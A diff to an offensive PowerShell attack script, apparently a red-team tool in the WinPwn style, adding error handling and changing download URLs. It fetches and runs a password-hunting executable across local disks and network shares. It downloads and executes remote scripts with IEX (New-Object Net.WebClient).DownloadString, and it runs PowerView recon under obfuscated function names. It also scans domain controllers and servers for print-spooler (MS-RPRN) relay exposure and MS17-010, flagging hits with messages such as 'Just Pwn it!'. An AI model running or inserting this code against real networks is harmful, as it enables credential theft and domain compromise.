@@ -736,7 +736,7 @@ function passhunt
             else
             {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
                 foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
@@ -747,7 +747,7 @@ function passhunt
         if ($local)
         {
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
             $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
@@ -765,7 +765,7 @@ function passhunt
         else
         {
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
         }
 
@@ -796,11 +796,9 @@ function domainreconmodules
             Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
             inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"
 
-            ## TODO Invoke-WebRequest -Uri 'https://github.com/NetSPI/goddi/releases/download/v1.1/goddi-windows-amd64.exe' -Outfile $currentPath\Recon.exe
-            ## TODO https://github.com/canix1/ADACLScanner 
-
             #Powerview
             Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
+	    try{
             skulked >> "$currentPath\DomainRecon\NetDomain.txt"
             televisions >> "$currentPath\DomainRecon\NetForest.txt"
             misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
@@ -821,7 +819,8 @@ function domainreconmodules
             sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
             ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
             condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
+            }catch{Write-Host "Got an error"}
+	    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
             breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt" 	        
 	    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SPN-Scan.ps1')
 	    Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"
@@ -884,11 +883,13 @@ function domainreconmodules
                     $domcontrols = terracing
                     foreach ($domc in $domcontrols.IPAddress)
                     {
+		    	try{
                         if (spoolscan -target $domc)
                         {
                             Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
-                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC_$domc.txt"
+                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
                         }
+			}catch{Write-Host "Got an error"}
                     }
 		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
             	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
@@ -897,11 +898,13 @@ function domainreconmodules
 		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
 			foreach ($acserver in $ActiveServers.dnshostname)
                     	{
+				try{
                         	if (spoolscan -target $acserver)
                         	{
                             		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
                             		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
                         	}
+				}catch{Write-Host "Got an error"}
                     	}
 		    }
                     
@@ -949,11 +952,13 @@ function MS17-10
 	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
 	foreach ($acserver in $ActiveServers.dnshostname)
         {
+		try{
          	if (Scan-MS17-10 -target $acserver)
                 {
                 	Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. Just Pwn this system!'
                         echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableServers.txt"
                 }
+		}catch{Write-Host "Got an error"}
         }
     }
     else
@@ -962,11 +967,13 @@ function MS17-10
 	$ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
 	foreach ($acserver in $ActiveServers.dnshostname)
         {
+		try{
          	if (Scan-MS17-10 -target $acserver)
                 {
                 	Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
                         echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableSystems.txt"
                 }
+		}catch{Write-Host "Got an error"}
         }
     }
 
